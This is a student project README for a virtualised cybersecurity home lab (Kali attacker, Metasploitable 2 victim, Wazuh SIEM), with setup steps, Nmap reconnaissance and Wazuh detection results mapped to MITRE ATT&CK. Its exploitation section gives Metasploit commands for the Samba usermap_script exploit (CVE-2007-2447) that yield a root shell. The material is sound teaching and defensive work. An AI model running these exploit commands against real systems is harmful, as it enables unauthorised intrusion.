# 🛡️ Cybersecurity Home Lab — Detection & Monitoring

> **B.Tech Project (BTP) | IIIT Pune**
> Based on: *"Designing and Implementing an Effective Cybersecurity Home Lab for Detection and Monitoring"* — ICCCNT 2023, IIT Delhi

A fully functional cybersecurity home lab built on a single machine using free and open-source tools. The lab simulates a real-world attack lifecycle — Reconnaissance → Exploitation → Detection — and demonstrates how a SIEM can detect and map attacks to the MITRE ATT&CK framework in real time.

---

## 📐 Lab Architecture

```
┌─────────────────────────────────────────────────┐
│           VirtualBox — Internal Network          │
│              (cyberlab, 10.0.0.x/24)             │
│                                                  │
│  ┌──────────┐   ┌──────────────┐   ┌──────────┐ │
│  │  Kali    │   │ Metasploitable│  │  Ubuntu  │ │
│  │ 10.0.0.1 │◄─►│   10.0.0.2   │◄─►│ 10.0.0.3 │ │
│  │ ATTACKER │   │    VICTIM     │  │   SIEM   │ │
│  └──────────┘   └──────────────┘   └──────────┘ │
└─────────────────────────────────────────────────┘
         Host-Only Adapter (192.168.56.103)
         → Wazuh Dashboard access from browser
```

| VM | Role | IP | Tools |
|---|---|---|---|
| Kali Linux 2026.1 | Attacker | 10.0.0.1 | Nmap, Metasploit |
| Metasploitable 2 | Victim | 10.0.0.2 | 20+ vulnerabilities |
| Ubuntu 22.04 + Wazuh | SIEM | 10.0.0.3 | Wazuh v4.7.5 |

---

## 🧰 Tools & Technologies

| Tool | Version | Purpose |
|---|---|---|
| VirtualBox | 7.x | Hypervisor — runs all VMs on one host |
| Kali Linux | 2026.1 | Penetration testing OS (offensive) |
| Metasploitable 2 | v2.0 | Intentionally vulnerable target |
| Wazuh | v4.7.5 | Open-source SIEM (defensive) |
| Nmap | Latest | Network/port scanning |
| Metasploit Framework | Latest | Exploitation framework |

---

## 🔧 Setup Guide

### Prerequisites
- A machine with at least **16 GB RAM** (all 3 VMs run simultaneously)
- [VirtualBox 7.x](https://www.virtualbox.org/wiki/Downloads) installed
- ~50 GB free disk space

---

### Step 1 — Network Setup in VirtualBox

Create an **Internal Network** named `cyberlab` in VirtualBox. All three VMs get this adapter. The Ubuntu/Wazuh VM gets an additional **Host-Only Adapter** so you can access the dashboard from your browser.

---

### Step 2 — Kali Linux (Attacker)

1. Download the [Kali Linux VirtualBox image](https://www.kali.org/get-kali/#kali-virtual-machines)
2. Import and assign the `cyberlab` internal network adapter
3. Set a static IP:

```bash
# Edit /etc/network/interfaces
auto eth0
iface eth0 inet static
    address 10.0.0.1
    netmask 255.255.255.0
```

4. Restart networking: `sudo systemctl restart networking`

---

### Step 3 — Metasploitable 2 (Victim)

1. Download [Metasploitable 2](https://sourceforge.net/projects/metasploitable/)
2. Import into VirtualBox, assign `cyberlab` network
3. Set static IP:

```bash
# Edit /etc/network/interfaces
auto eth0
iface eth0 inet static
    address 10.0.0.2
    netmask 255.255.255.0
```

> ⚠️ **Never expose Metasploitable 2 to the internet.** It is intentionally insecure.

---

### Step 4 — Ubuntu + Wazuh SIEM (Defender)

1. Install [Ubuntu Server 22.04](https://ubuntu.com/download/server)
2. Assign two adapters: `cyberlab` internal + Host-Only
3. Configure static IP via netplan (`/etc/netplan/01-network-manager-all.yaml`):

```yaml
network:
  version: 2
  renderer: NetworkManager
  ethernets:
    enp0s3:
      addresses:
        - 10.0.0.3/24
    enp0s8:
      dhcp4: true
```

4. Install Wazuh (single-node):

```bash
curl -sO https://packages.wazuh.com/4.7/wazuh-install.sh
sudo bash wazuh-install.sh -a
```

5. Access dashboard at: `https://192.168.56.103` (from host browser)

---

### Step 5 — Connect Metasploitable to Wazuh via Syslog

Since Metasploitable 2 cannot run a Wazuh agent, configure **syslog forwarding** for agentless monitoring:

On Metasploitable, add to `/etc/rsyslog.conf`:
```
*.* @10.0.0.3:514
```

On Wazuh (Ubuntu), enable syslog input in `/var/ossec/etc/ossec.conf`:
```xml
<remote>
  <connection>syslog</connection>
  <port>514</port>
  <protocol>udp</protocol>
</remote>
```

Restart Wazuh: `sudo systemctl restart wazuh-manager`

---

## ⚔️ Attack Simulation

### Phase 1 — Reconnaissance (Nmap)

```bash
# From Kali
nmap -sV -O 10.0.0.2
```

**Key services discovered on Metasploitable 2:**

| Port | Service | Version |
|---|---|---|
| 21/tcp | FTP | vsftpd 2.3.4 |
| 22/tcp | SSH | OpenSSH 4.7p1 |
| 80/tcp | HTTP | Apache 2.2.8 |
| 139/445 | SMB | Samba 3.x–4.x |
| 3306/tcp | MySQL | 5.0.51a |
| 5432/tcp | PostgreSQL | 8.3 |

> 20+ open ports discovered. OS fingerprinted: Linux 2.6.x

---

### Phase 2 — Exploitation (Metasploit)

**Vulnerability:** CVE-2007-2447 — Samba `usermap_script` Command Injection

Allows unauthenticated remote code execution via malformed MS-RPC requests on Samba 3.0.0–3.0.25rc3.

```bash
# From Kali — launch Metasploit
msfconsole

# Inside Metasploit
use exploit/multi/samba/usermap_script
set RHOSTS 10.0.0.2
set LHOST 10.0.0.1
run

# Verify root access
whoami
# Output: root
```

---

### Phase 3 — Detection (Wazuh SIEM)

After the exploit, Wazuh automatically detected and mapped the events to **MITRE ATT&CK**:

| Rule ID | Description | MITRE Technique | Tactic |
|---|---|---|---|
| 5402 | Successful sudo to ROOT executed | T1548.003 | Privilege Escalation |
| 5501 | PAM: Login session opened | T1078 | Initial Access / Persistence |
| 5502 | PAM: Login session closed | T1078 | Defense Evasion |
| 502 | Wazuh server started | — | Detection Active |

**Total events detected: 55+**

Access the dashboard at `https://192.168.56.103` → Security Events → MITRE ATT&CK

---

## 📊 Key Results

- ✅ Successfully replicated the full attack lifecycle in an isolated environment
- ✅ CVE-2007-2447 achieved unauthenticated root shell in seconds
- ✅ Wazuh SIEM detected and mapped all attacks to MITRE ATT&CK in real time
- ✅ Syslog forwarding enabled agentless monitoring of the legacy Metasploitable system
- ✅ Entire lab runs on a single host machine with 16 GB RAM

---

## 📁 Repository Structure

```
cybersecurity-home-lab/
│
├── README.md                  ← You are here
├── network-config/
│   ├── kali-interfaces.txt    ← Kali static IP config
│   ├── metasploitable-interfaces.txt
│   └── ubuntu-netplan.yaml    ← Ubuntu/SIEM netplan config
├── wazuh-config/
│   └── ossec.conf             ← Wazuh syslog/agent config
├── screenshots/
│   ├── nmap-scan.png
│   ├── metasploit-exploit.png
│   ├── wazuh-dashboard.png
│   └── wazuh-alerts-table.png
└── report/
    └── ICCCNT_2023_paper.pdf  ← Reference research paper
```

---

## 🔗 Reference

> Dadiyala, C. et al. (2023). *Designing and Implementing an Effective Cybersecurity Home Lab for Detection and Monitoring.* 14th International Conference on Computing, Communication and Networking Technologies (ICCCNT), IIT Delhi. IEEE-56998.

---

## ⚠️ Disclaimer

This lab is built entirely on isolated virtual machines with no internet access during attack simulations. All tools and techniques are used strictly for educational purposes within a controlled environment. Do not attempt to replicate any attack techniques on systems you do not own or have explicit permission to test.

---

*Presented by Harshita Verma | IIIT Pune*
